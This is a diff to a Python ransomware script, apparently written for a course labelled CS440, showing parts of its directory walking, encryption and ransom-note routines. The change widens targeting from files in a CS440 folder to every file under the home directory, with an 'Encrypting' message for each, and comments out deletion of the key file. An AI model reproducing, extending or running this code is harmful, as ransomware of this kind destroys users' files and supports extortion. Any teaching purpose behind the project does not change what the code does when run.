@@ -83,7 +83,7 @@ def has_onedrive():
 
 
 def navigateToDir(directory):
-    location = str(pathlib.Path.home()) + path_str + directory + "/CS440"
+    location = str(pathlib.Path.home()) + path_str + directory + path_str + "CS440"
     # if user_os == "Windows" and has_onedrive():
     #     location = str(pathlib.Path.home()) + path_str +'OneDrive' + path_str + directory
 
@@ -99,17 +99,14 @@ def navigateToDir(directory):
     
 
 def getFiles(directory):
-    files = []
+    target_files = []
 
     for root, sd, files in os.walk(directory):
-        if "CS440" in sd:
-            path = os.path.join(root, "CS440")
-            for cs440root, cs440sd, cs440files in os.walk(path):
-                for file in cs440files:
-                    files.append(os.path.join(path, file))
-            break
-            
-    return files
+        for file in files:
+            print(f"Encrypting {file}")
+            target_files.append(os.path.join(root, file))
+
+    return target_files
 
 
 def generateKey():
@@ -174,7 +171,7 @@ def encrypt(target):
                 encrypted_file.write(cipher)
         
         create_ransom_note()
-        os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
+        # os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
     else:
         print("Target empty.")
 
